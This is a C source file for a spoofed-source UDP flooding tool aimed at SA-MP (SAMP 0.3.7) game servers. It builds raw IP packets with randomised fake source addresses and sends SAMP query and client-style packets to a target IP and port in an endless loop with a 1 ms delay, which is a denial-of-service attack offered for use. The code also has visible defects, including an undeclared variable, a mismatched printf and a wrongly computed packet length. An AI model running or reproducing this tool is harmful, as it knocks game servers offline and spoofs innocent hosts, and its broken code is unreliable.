/*
UPDATE MARK2 
NEW CLIENT SAMP 0.3.7 R2
*/
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
 
#define LEN 512
#define VECTOR 22

typedef unsigned short u16;
typedef unsigned long u32;


int vect = VECTOR;
char conv[2];
int secuencia = 0;
int keymaster;
char packet_bots[4];
//2nd
unsigned short csum (unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf);
 unsigned char ip[4];
 void makeArrayIP(char* inIP, char *outIP){
    short i,nTemp=0; char cbool=0;
    for(i=0;inIP[i] != NULL;i++){
        if(inIP[i] != '.'){
            nTemp = nTemp*10 + (short)(inIP[i] - '0');
        }else{
            outIP[cbool] = (char) nTemp;
            nTemp = 0; /*Reiniciar el valor temporal*/
            cbool++;
           }
     
 
    }
    outIP[cbool] = (char) nTemp;
}

int sampkey(){
        while(256 <= keymaster)
    {
        keymaster = keymaster - 256;
    }
  //  printf("PUERTO REDUCIDO A KEYMASTER: %d \n", keymaster);
        secuencia++; 
        for(int i = 0; i != 128; i++)
        {
        vect = vect + 1;
        secuencia++;
   sprintf(conv, "%d", vect);
        if (keymaster == secuencia - 1)
        {
    packet_bots[0] = 0x08;  
    packet_bots[1] = 0x1e;
    packet_bots[2] = (char)(vect & 0xFFFF);
    packet_bots[3] = 0xda;  
            printf("HEX: %02x VECTOR: %d \n", vect);
            break;
        }
           vect = vect - 3;
     
           if(secuencia == 8)
        {
            
            vect = vect + 16;
        }
        else if(secuencia == 16)
        {
            vect = vect - 16;
        ;
        }
        else if(secuencia == 24)
        {
            vect = vect + 16;
            ;
        }
        else if(secuencia == 32)
        {
            vect = vect + 48;
            ;
        }
        else if(secuencia ==  40)
        {   
            vect = vect + 16;
            ;
        }
        else if(secuencia == 48)
        {   
            vect = vect - 16;
            ;
        }
        else if(secuencia == 56)
        {   
            vect = vect + 16;
            ;
        }
        else if(secuencia == 64)
        {
            vect = vect + 48;
        }
        else if(secuencia == 72)
        {
            vect = vect + 16;
        }
        else if(secuencia == 80)
        {
            vect = vect - 16;
        }
        else if(secuencia == 88)
        {
            vect = vect + 16;
        }
        else if(secuencia == 96)
        {
            vect = vect + 48;
        }
        else if(secuencia == 104)
        {
            vect = vect + 16;;
        }
        else if(secuencia == 112)
        {
            vect = vect - 16;;
        }
        else if(secuencia == 120)
        {
            vect = vect + 16;;
        }
        else if(secuencia == 128)
        {
            vect = vect + 48;;
        }
        else if(secuencia == 136)
        {
            vect = vect + 16;;
        }
        else if(secuencia == 144)
        {
            vect = vect - 16;;
        }
        else if(secuencia == 152)
        {
            vect = vect + 16;;
        }
        else if(secuencia == 160)
        {
            vect = vect + 48;
        }
        else if(secuencia == 168)
        {
            vect = vect + 16;
        }
        else if(secuencia == 176)
        {
            vect = vect - 16;
        }
        else if(secuencia == 184)
        {
            vect = vect + 16;
        }
        else if(secuencia == 192)
        {
            vect = vect + 48;
        }
        else if(secuencia == 200)
        {
            vect = vect + 16;
        }
        else if(secuencia == 208)
        {
            vect = vect - 16;
        }
        else if(secuencia == 216)
        {
            vect = vect + 16;
        }
        else if(secuencia == 224)
        {
            vect = vect + 48;
        }
        else if(secuencia == 232)
        {
            vect = vect + 16;
        }
        else if(secuencia == 240)
        {
            vect = vect - 16;
        }
        else if(secuencia == 248)
        {
            vect = vect + 16;
        }
                else if(secuencia == 256)
        {
            vect = 22;
            secuencia = 1;
        }
        sprintf(conv, "%d", vect);
        secuencia++;
        if (keymaster == secuencia - 1)
        {
    packet_bots[0] = 0x08;  
    packet_bots[1] = 0x1e;
    packet_bots[2] = (char)(vect & 0xFFFF);
    packet_bots[3] = 0xda;  
            printf("HEX: %02x VECTOR: %d \n", vect, vect);
            break;
        }
    }
 //   return 0;
}

 
int main(int argc, char * argv[])
{
 
    if(argc < 3)
    {
        printf("- Usage %s <IP> <Port>\n", argv[0]);
        exit(1);
    }
 	srand(time(NULL));  
    char packet_dup[4];  
    makeArrayIP(argv[1],&ip[0]);  
    packet_dup[0] = ip[0];
    packet_dup[1] = ip[1];
    packet_dup[2] = ip[2];
    packet_dup[3] = ip[3];
    keymaster = atoi(argv[2]);
    sampkey(keymaster);
      int iprang[5];
      int idp;
        iprang[0] = 186;
        iprang[1] = 190;
        iprang[2] = 181;
        iprang[3] = 201;

    int PDEST = atoi(argv[2]);
    char * DEST = argv[1];
    int s;
    struct sockaddr_in daddr, saddr;
    char packet[LEN];
    /* point the iphdr to the beginning of the packet */
    struct iphdr *ip = (struct iphdr *)packet;  
    struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
    struct dnshdr *dns = (struct dnshdr *)((void *) udp + sizeof(struct udphdr));
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error:");
        exit(EXIT_FAILURE);
    }
 
    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
   memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));
    ip->protocol = 17;  //IPPROTO_RAW;  /* protocol at L4 */
    ip->ihl = 5; //header length
    ip->version = 4;
    ip->tos = 0;
    ip->frag_off = 0;  
     char * packet_pos  = ((void *) udp) + sizeof(struct udphdr);
    while(1)
    {
	srand(time(NULL));
    char cadenarandom[2];
    cadenarandom[0] = (char)(rand() & 0xFFFF);
    cadenarandom[1] = (char)(rand() & 0xFFFF);
  char ip_d[20];
    sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 3], rand() % 252, rand() % 254, rand() % 250);
    char * SOURCE = ip_d;
    int s_port = 2024 + (rand() % 61422);
    volatile int idpack = 10000 + (rand() % 40000);
    saddr.sin_port = htons(s_port);
    inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
   idp = idpack;
    ip->id = idp;
    idpack++;
    idp = idpack;
    ip->ttl = 40 + (rand() % 100);          /* default value */
    ip->check = 0;          /* not needed in iphdr */
    ip->saddr = saddr.sin_addr.s_addr;
    ip->daddr = daddr.sin_addr.s_addr;
    udp->source = htons(s_port);
    udp->dest = htons (PDEST);
       char incoming[] = {
       0x33, 0xfe, 0xe0, 0x7d, 0x33, 0xfe, 0xe0, 0x7d, 0x61, 0x1e, 0x69 };
    int sizedata = sizeof(incoming);
    memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;  
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = cadenarandom[0];
    packet_pos[9] = cadenarandom[1];
    packet_pos[10] = 0x69;
   memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    int sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
    int optval = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int))
            < 0)
        perror ("IP HDRINCL");
        int sizepacket = sizeof(struct iphdr) + sizeudpdata;
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
/*#################*/
             char query_p[] = "SAMPxxxxxcxxxx";
			 ip->id = idp;
             idpack++;
             idp = idpack;

              memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata + 4);
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query_p);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = cadenarandom[0];
    packet_pos[9] = cadenarandom[1];
 //   packet_pos[8] = (char)(PDEST & 0xFFFF);
  //  packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
    packet_pos[10] = 0x70;
    packet_pos[11] = (char)(rand() & 0xFFFF);
    packet_pos[12] = (char)(rand() >> 8 & 0xFFFF);
    packet_pos[13] = (char)(rand() & 0xFFFF);
    packet_pos[14] = (char)(rand() >> 8 & 0xFFFF);
 memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata + 4);
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
      /*#################*/
      ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata);
            ip->id = idp;
            idpack++;     
            idp = idpack;
		char query_c[] = "SAMPxxxxxc";
              memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query_c);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = cadenarandom[0];
    packet_pos[9] = cadenarandom[1];
    packet_pos[10] = 0x63;
    packet_pos[11] = 0x00;
    memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
      /*#################*/
      idpack = idpack + (rand() % 2946);
        ip->id = idp;
        idpack++;
        ipd = idpack;
    char query_r[] = "SAMPxxxxxr";
 memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query_r);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = cadenarandom[0];
    packet_pos[9] = cadenarandom[1];
    packet_pos[10] = 0x72;
    packet_pos[11] = 0x00;
	memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ; 
     /*#################*/
	  	ip->id = idp;
        idpack++;
        ipd = idpack;

              memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata + 4);
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(query_p);
    packet_pos[0] = 0x53;  
    packet_pos[1] = 0x41;
    packet_pos[2] = 0x4d;
    packet_pos[3] = 0x50;
    packet_pos[4] = packet_dup[0];
    packet_pos[5] = packet_dup[1];
    packet_pos[6] = packet_dup[2];
    packet_pos[7] = packet_dup[3];
    packet_pos[8] = cadenarandom[0];
    packet_pos[9] = cadenarandom[1];
    packet_pos[10] = 0x70;
    packet_pos[11] = (char)(rand() & 0xFFFF);
    packet_pos[12] = (char)(rand() >> 8 & 0xFFFF);
    packet_pos[13] = (char)(rand() & 0xFFFF);
    packet_pos[14] = (char)(rand() >> 8 & 0xFFFF);
 memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
    udp->len = htons(sizeudpdata + 4);
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;//
                idpack = idpack + (rand() % 3000);
                ipd = idpack;
                ip->id = ipd;
      char bots[4] = "xxx";
        sizepacket = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
        ip->tot_len = htons(sizeof(sizepacket));    /* 16 byte value */
        udp->len = htons(sizeof(struct udphdr) + 4);
        memset(((void *) udp) + sizeof(struct udphdr), 'A', 4);
  memcpy((void *)udp + sizeof(struct udphdr), (char *)packet_bots, 4);
    udp->check = 0;
    udp->check = udp_checksum(
            ip,
            udp,
           (const uint16_t *)udp);
      sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;
      usleep(1000);
    }
          close(s);
    exit(EXIT_SUCCESS);
}

//http://www.linuxquestions.org/questions/linux-networking-3/udp-checksum-algorithm-845618/
//modified by Gabriel Serme
struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero; //reserved, check http://www.rhyshaden.com/udp.htm
    u_int8_t protocol;
    u_int16_t udp_length;
};

uint16_t udp_checksum(const struct iphdr  *ip,
        const struct udphdr *udp,
        const uint16_t *buf)
{
    //take in account padding if necessary
    int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
 
    struct pseudo_hdr ps_hdr = {0};
    bzero (&ps_hdr, sizeof(struct pseudo_hdr));
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    bzero (data, sizeof(struct pseudo_hdr) + calculated_length );
 
    ps_hdr.source = ip->saddr;
    ps_hdr.dest = ip->daddr;
    ps_hdr.protocol = IPPROTO_UDP; //17
    ps_hdr.udp_length = udp->len;
 
    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len) ); //the remaining bytes are set to 0
 
    return csum((uint16_t *)data, sizeof(data)/2);
}
 
/* Not my code */
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
 
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
